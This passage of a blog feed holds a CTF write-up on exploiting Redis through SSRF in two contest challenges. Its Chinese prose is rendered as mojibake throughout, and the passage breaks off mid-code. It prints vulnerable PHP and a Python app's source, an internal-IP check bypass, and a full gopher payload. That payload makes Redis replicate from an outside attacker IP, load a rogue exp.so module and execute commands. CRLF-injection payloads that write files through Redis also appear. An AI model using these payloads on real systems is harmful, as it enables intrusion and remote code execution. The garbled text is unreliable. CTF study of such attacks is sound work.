title="summary"></a>summary</h2><p>æœ¬æ¬¡æ¸—é€å‰åèŠ±äº†ä¸å°‘æ—¶é—´ã€‚ç›¸æ¯”ä¹‹å‰çœ‹ippsecè§†é¢‘åšé€€å½¹é¶æœº,ç‹¬ç«‹å®Œæˆä¸€å°å›°éš¾é¶æœºçœŸçš„æ„Ÿè§‰å¾ˆä¸é”™ï¼Œä¹Ÿå¾ˆè‰°è¾›ã€‚å½“ç„¶ï¼Œèƒ½å®Œæ•´åšå®Œå¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºè¿™å°é¶æœºçš„å†…å®¹å¾ˆé€‚åˆCTFçš„webé€‰æ‰‹ã€‚è‡ªå·±åœ¨å¾ˆå¤šåœ°æ–¹ä¹Ÿéƒ½è¿ç”¨åˆ°äº†è‡ªå·±æ—¥å¸¸æ¯”èµ›æ—¶çš„å°æŠ€èƒ½ã€‚åŒæ—¶é¶æœºå…³äºhttp/3,xslt-&gt;RCE,ææƒæ–¹æ³•ç­‰ç­‰éƒ½æœ‰å¾ˆå¤§æ”¶è·ã€‚æ‰€ä»¥éå¸¸èµã€‚</p><p>å…¶å®å‰å‰åååšäº†å¿«20å¤šå°HTBé¶æœº,æ„Ÿè§‰è‡ªå·±ç»å¸¸å¡åœ¨<code>enumeration</code>ä¹Ÿå°±æ˜¯æšä¸¾(ä¿¡æ¯æ”¶é›†)ä¸Šã€‚è€Œè¿™å¾€å¾€æ˜¯è§£å†³é—®é¢˜çš„å…³é”®ã€‚å¸Œæœ›èƒ½å¤Ÿå¤šé”»ç‚¼ä¸‹è‡ªå·±è¿™æ–¹é¢çš„èƒ½åŠ›å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢Redis-wdbç„æ­¦ç»„ssrfme&amp;pwnhubå…¬å¼€èµ›</title>
      <link href="2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&amp;pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
      <url>2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&amp;pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<ul><li>æœ¬å­¦æœŸæœ€åä¸€ç¯‡æ–‡ç« ã€‚å†™å®Œå°±è¦å¤ä¹ å»äº†ã€‚</li></ul><p>æ–‡ç« å†™åœ¨RCTFç¬¬ä¸€å¤©ã€‚webç‹—çœŸå®è‡ªé—­.æœ¬æ¥æƒ³æŠŠå‡æœŸå‰æœ€åä¸€ç¯‡æ–‡ç« ç•™ç»™RCTFwpçš„ã€‚ç°åœ¨çœ‹éƒ½ä¸ç”¨å†™äº†,åæ­£åªä¼šä¸€é“ã€‚åŸå…ˆå¬è¯´è¿‡ROISçš„webå¾ˆå¼ºï¼Œzsxå¤§å¸ˆå‚…æ˜¯å·¨ä½¬ï¼Œæ²¡æƒ³åˆ°ææ€–å¦‚æ–¯ã€‚(è¿™å°±æ˜¯ROISè·Ÿzsxçš„å¯æ€•ä¹‹å¤„å—,æ€•äº†æ€•äº†)</p><p>æ‰€ä»¥æ¯”èµ›ç¬¬ä¸€å¤©ç•™æ„åˆ°æœ‰ä¸ªpwnhubå…¬å¼€èµ›ï¼Œäºæ˜¯å°±å»æ°´äº†ä¸‹ï¼Œå¥½æ­¹æ˜¯æ‹¿äº†ä¸ªé‚€è¯·ç ã€‚è¿™é¢˜å› ä¸ºæ˜¯redisç›¸å…³ï¼Œè”æƒ³åˆ°ä¹‹å‰ç½‘é¼æ¯ç„æ­¦çš„é‚£é“redisï¼ŒåŠ ä¸Šè‡ªå·±åŸæ¥åŸºæœ¬æ²¡åšè¿‡redisé¢˜ï¼Œæ‰“ç®—æŠŠè¿™ä¸¤é“é¢˜ç›¸å…³çŸ¥è¯†ç‚¹éƒ½æ€»ç»“ä¸‹ï¼Œå½“åšè¿™å­¦æœŸçš„æ”¶å°¾å§ã€‚</p><a id="more"></a><h2 id="ç½‘é¼æ¯ç„æ­¦ç»„ssrfme"><a href="#ç½‘é¼æ¯ç„æ­¦ç»„ssrfme" class="headerlink" title="ç½‘é¼æ¯ç„æ­¦ç»„ssrfme"></a>ç½‘é¼æ¯ç„æ­¦ç»„ssrfme</h2><p>è¿™é¢˜çœŸæ²¡æƒ³åˆ°ï¼Œæ˜¯éƒå¸ˆå‚…å‡ºçš„é¢˜â€¦â€¦ç½‘ä¸Šå¤§éƒ¨åˆ†åšæ³•éƒ½æ˜¯ä¸»ä»å¤åˆ¶RCEåšçš„ï¼Œä¸è¿‡éƒå¸ˆå‚…è¯´è¯•è¯•ä¸ç”¨ä¸»ä»å¤åˆ¶åš,ä¸çŸ¥é“æ˜¯ä»€ä¹ˆå§¿åŠ¿ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">        safe_request_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally. </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ‹¿åˆ°é¢˜ç›®æ˜¯ç»å…¸çš„yuligeæ ‡é…ssrfã€‚å¯ä»¥çœ‹åˆ°,æˆ‘ä»¬å…è®¸ä½¿ç”¨çš„schemeæ˜¯http,gopherä»¥åŠdictã€‚ç„¶åéœ€è¦ç»•è¿‡ä¸€ä¸ªå†…ç½‘ipæ£€æµ‹ï¼Œå³å¯è¿›è¡Œcurlçš„ssrf.</p><p>çœ‹åˆ°æç¤ºè¯´è®¿é—®hint.phpã€‚çœ‹æ¥éœ€è¦ç»•è¿‡ipé™åˆ¶è¿›è¡Œå†…ç½‘è®¿é—®ã€‚è¿™ä¸ªç‚¹ä¹‹å‰æ€»ç»“ssrfæ—¶æåˆ°è¿‡,ç®—æ˜¯åŸºæœ¬trickäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;bycsec.top@0.0.0.0&#x2F;hint.php</span><br></pre></td></tr></table></figure><p><code>0.0.0.0</code>é»˜è®¤æœ¬åœ°ã€‚<code>@</code>åˆ™æ˜¯å› ä¸ºphpparse_urlåªä¼šåŒ¹é…åˆ°æœ€åä¸€ä¸ª<code>@</code>åçš„å†…å®¹çš„åŸå› ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡äº†ã€‚<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¾—åˆ°ä¸€ä¸ªrediså¯†ç ã€‚ä¸‹é¢æ˜¯è¯•å›¾å¾—åˆ°webshell</p><p>é€šå¸¸æ¥è¯´ssrf+redis getshellä¸»è¦æ˜¯è¿™å‡ ç§å§¿åŠ¿</p><ol><li>å¯å†™webshellã€‚</li><li>å†™sshå…¬é’¥</li><li>å†™crontabåå¼¹shell(ä»…é™centos)</li><li>ä¸»ä»å¤åˆ¶RCE</li></ol><p>è¿™é‡Œæœ€ç®€å•çš„æ˜¯å¯å†™webshellçš„æƒ…å†µã€‚å…·ä½“ä¸Šå°±è·Ÿä¹‹å‰GKCTFé‚£é¢˜ä¸€æ ·ï¼Œpayloadç¼–ç å¥½å°±èƒ½ç”¨gopheræ‰“ã€‚</p><p>æ­¤å¤„è™½ç„¶æ˜¯php,ä½†æ˜¯å¹¶ä¸èƒ½å†™webshellã€‚å‰©ä¸‹çš„å½“ç„¶æ˜¯æ›´ä¸å¯èƒ½çš„ã€‚å› ä¸ºæ²¡æœ‰sshè·ŸcrontabæœåŠ¡ã€‚é‚£ä¹ˆå€¼å¾—ä¸€è¯•çš„å°±æ˜¯ä¸»ä»å¤åˆ¶RCEäº†</p><p>è¯¦ç»†çŸ¥è¯†å¯ä»¥å»çœ‹éƒå¸ˆå‚…åœ¨xrayç¤¾åŒºå‘çš„rediså®‰å…¨å­¦ä¹ å°è®°ã€‚</p><p>ä¸»ä»å¤åˆ¶ï¼Œä¸»è¦åˆ©ç”¨çš„å°±æ˜¯redis<code>SLAVE OF</code>çš„å‘½ä»¤ï¼Œå°†ä¸€å°redisçš„æ•°æ®å¤åˆ¶åˆ°å¦ä¸€å°ã€‚å‰è€…ä¸ºä¸»èŠ‚ç‚¹ï¼Œåè€…ä¸ºä»èŠ‚ç‚¹ã€‚è¿™ä¸ªå¤åˆ¶è¿‡ç¨‹æ˜¯å•å‘çš„ã€‚</p><p>è€Œæˆ‘ä»¬redisä¸»ä»å¤åˆ¶RCEçš„æ–¹å¼ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨äº†redisç®€æ´çš„åè®®ï¼Œæ„é€ æ¶æ„æœåŠ¡å™¨ï¼Œå°†åŸæœ¬ç”¨äºå­˜å‚¨å¤‡ä»½çš„rdbæ–‡ä»¶,æ›¿æ¢ä¸ºæˆ‘ä»¬æ¶æ„çš„exp.soã€‚è¿™æ ·èŠ‚ç‚¹redisä¸­å°±ä¼šè‡ªåŠ¨ç”Ÿæˆexp.soï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨load_moduleè¿›è¡Œrce.</p><p>éœ€è¦æ³¨æ„çš„æ˜¯,å› ä¸ºåˆ©ç”¨rediså†™æ–‡ä»¶çš„æ–¹å¼å†™å…¥exp.soä¼šå› ä¸ºredisçš„å¤§é‡æ— ç”¨æ•°æ®paddingå½±å“å…¶æ­£å¸¸ä½¿ç”¨ã€‚è€Œæˆ‘ä»¬åˆ©ç”¨ä¸»ä»å¤åˆ¶ä¸Šä¼ soï¼Œä¸»è¦ç”¨åˆ°çš„æ˜¯webåº”ç”¨å±‚é¢çš„ä¸Šä¼ ã€‚è€Œphpé»˜è®¤çš„www-dataæ˜¯644,æ‹¥æœ‰åªè¯»æƒé™ã€‚å®æˆ˜ä¸­æ˜¯å®Œå…¨å¯ä»¥ç»“åˆä¸Šä¼ æ”»å‡»çš„ã€‚</p><p>å› æ­¤æœ¬é¢˜åªè¦ç”¨åˆ°ä¸¤ä¸ªä¸¤ä¸ªå·¥å…·å³å¯<br><a href="https://github.com/xmsec/redis-ssrf" target="_blank" rel="noopener">https://github.com/xmsec/redis-ssrf</a><br><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>å‰è€…ç”¨äºç”Ÿæˆpayloadï¼ŒåŒæ—¶ä¹Ÿå¯å¯åŠ¨æ¶æ„serverã€‚åè€…ä¸»è¦æ˜¯exp.soã€‚å»ºè®®æŠŠexp.soç›´æ¥æ‹·åˆ°å‰é¢æ–‡ä»¶å¤¹ä¸‹å°±è¡Œäº†ã€‚</p><p>ç„¶åæˆ‘ä»¬è®¾ç½®å¯¹åº”çš„payloadã€‚ä¿®æ”¹<code>ssrf-redis.py</code>åœ¨é»˜è®¤çš„rceæ¨¡å¼ä¸‹,åªè¦æ”¹å‘½ä»¤ï¼Œlhost,lport,å¯†ç å³å¯ã€‚ç„¶åå¯åŠ¨æ¶æ„æœåŠ¡å™¨ã€‚ç”¨å‰é¢ç”Ÿæˆå¥½çš„payloadç›´æ¥æ‰“ã€‚<br><code>url=gopher%3a%2f%2fwww.bycsec.top%400.0.0.0%3a6379%2f_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%252430%250D%250Awelcometowangdingbeissrfme6379%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A120.27.246.202%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2ftmp%2f%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2ftmp%2fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252413%250D%250Acat%2524%257BIFS%257D%2ffl%252A%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</code><br>ç¬¬ä¸€æ¬¡æ‰“ä¼šå»ºç«‹å¥½ä¸»ä»å¤åˆ¶ã€‚è¿™æ—¶å€™å°±å¯ä»¥å…³æ‰serverç›´æ¥ç”¨ssrfå‘½ä»¤è¿›è¡ŒRCEäº†ã€‚</p><p><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="pwnhubå…¬å¼€èµ›-ä¸ƒçˆªé±¼-flagåœ¨çº¿çˆ¬å–ç³»ç»Ÿ"><a href="#pwnhubå…¬å¼€èµ›-ä¸ƒçˆªé±¼-flagåœ¨çº¿çˆ¬å–ç³»ç»Ÿ" class="headerlink" title="pwnhubå…¬å¼€èµ›-ä¸ƒçˆªé±¼ flagåœ¨çº¿çˆ¬å–ç³»ç»Ÿ"></a>pwnhubå…¬å¼€èµ›-ä¸ƒçˆªé±¼ flagåœ¨çº¿çˆ¬å–ç³»ç»Ÿ</h2><p>è¿™æ¬¡åšé¢˜æœ¬æ¥æ˜¯å› ä¸ºè¢«RCTFè™æƒ¨äº†è·‘å»çœ‹çœ‹çš„ã€‚ç»“æœéš¾åº¦ä¼¼ä¹é€‚ä¸­ã€‚åˆšå¥½ç»™æˆ‘ä¸€ç‚¹ç‚¹æ»¡è¶³æ„Ÿã€‚</p><p>é¦–å…ˆé¢˜ç›®serveræ˜¯gunicornçš„é…ç½®ã€‚è¿™ä¸ªä»headerä¸­å¯ä»¥çœ‹å‡ºæ¥ã€‚ç„¶åæ³¨å†Œç™»å½•åå‘ç°æœ‰ä¸€ä¸ªçˆ¬è™«<code>/spider</code>è·¯ç”±ã€‚æ‹¿<code>file:///etc/passwd</code>æ‰“ä¸€å‘å¯ä»¥è¯»åˆ°/etc/passwd.çœ‹æ¥åˆæ˜¯ä¸ªssrfã€‚<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åŒæ—¶æ³¨æ„åˆ°ç”¨æˆ·é‡Œæœ‰redis-dbè·Ÿserver.çœ‹æ¥æ˜¯æœ‰redisäº†ã€‚</p><p>ç®€å•æ¢æµ‹ä¸‹å‘ç°6379ç«¯å£æœ‰redisçš„æŠ¥é”™å›æ˜¾ã€‚</p><p>ç¬¬ä¸€ååº”å…ˆè¯»äº†ä¸‹bash_historyã€‚å‘ç°ä¸€ä¸ªæ²¡æƒé™ä¸€ä¸ªä¸å­˜åœ¨ã€‚(å‡å¦‚èƒ½ç”¨è¿™ç§æ–¹å¼çŸ¥é“æ ¹ç›®å½•flagçš„åç§°é‚£å°±ä¼šç®€ä¾¿å¾ˆå¤šï¼Œè¿™ä¹Ÿæ˜¯æˆ‘åœ¨wustctfå½“æ—¶ç›´æ¥è¯»åˆ°flagçš„éé¢„æœŸæ€è·¯)</p><p>ç„¶åæœŸé—´è§¦å‘äº†æŠ¥é”™ã€‚å‘ç°æ˜¯pythonçš„urllibåº“è°ƒç”¨çš„urlopenã€‚è¿™ä¸ªåº“ç†Ÿæ‚‰çš„è¯åº”è¯¥éƒ½çŸ¥é“æ˜¯å­˜åœ¨CRLFçš„æ´çš„ã€‚æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªssrfå¾€è‡ªå·±æœåŠ¡å™¨æ‰“ä¸€æ³¢ã€‚ncç›‘å¬çš„è¯ä¼šå‘ç°æ˜¯python3.5çš„urllibã€‚</p><p>å¯¹urllibçš„ssrf,ç”¨httpåè®®ä¸‹çš„å¯ä»¥ç›´æ¥æ‰“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aKEYS%20*%0d%0apadding</span><br><span class="line">åªè¿”å›$-1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aconfig%20set%20dir%20&#x2F;tmp%0d%0aconfig%20set%20dbfilename%20byc%0d%0asave%0d%0apadding</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;tmp&#x2F;byc</span><br><span class="line">æˆåŠŸå†™å…¥æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ­¤æ—¶å¤§è‡´ç¡®è®¤å¯ä»¥ç”¨è¿™ä¸ªssrfæ‰“redisäº†ã€‚ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬pythonæœåŠ¡å™¨ä¸èƒ½ç›´æ¥å†™webshellã€‚ä¸èƒ½å†™å®šæ—¶å’Œkeyã€‚è€Œä¸”ç”±äºgopherä¸æ”¯æŒä¹Ÿä¸èƒ½è¿›è¡ŒRCEã€‚æ¢è¨€ä¹‹æˆ‘ä»¬åªèƒ½å¯¹redisè¿›è¡Œå‘½ä»¤æ“ä½œã€‚æ‰€ä»¥æˆ‘æƒ³å…ˆå°è¯•æ¢æµ‹æºç ä¿¡æ¯</p><p>é¦–å…ˆæ˜¯<code>/proc/self/cmdline</code>ã€‚è¯»åˆ°äº†gunicornçš„ç›¸å…³é…ç½®ã€‚</p><p><code>/usr/local/python3/bin/python3.5/usr/local/python3/bin/gunicorn--config=config.pyrun:app</code></p><p>å¾—åˆ°run.pyã€‚è¿™é‡Œç›´æ¥ç”¨<code>/proc/self/cwd/run.py</code>å»è¯»å·¥ä½œç›®å½•ä¸‹çš„æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> sipder <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> StrictRedis</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, redirect, session, request, make_response, url_for, abort, render_template_string</span><br><span class="line"><span class="keyword">from</span> user <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="number">6379</span>,db=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">"Cookie"</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"login"</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">'GET'</span>:</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        cookie = Cookie()</span><br><span class="line">        cookie.create = username</span><br><span class="line">        cookie = cookie.create</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> redis.exists(cookie):</span><br><span class="line">                user = pickle.loads(redis.get(cookie))</span><br><span class="line">                <span class="keyword">if</span> user.verify_pass(password):</span><br><span class="line">                    resp = make_response(redirect(url_for(<span class="string">'home'</span>)))</span><br><span class="line">                    resp.set_cookie(<span class="string">'Cookie'</span>,cookie)</span><br><span class="line">                    <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/register/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">'GET'</span>:</span><br><span class="line">        email = request.form.get(<span class="string">'email'</span>)</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        user = 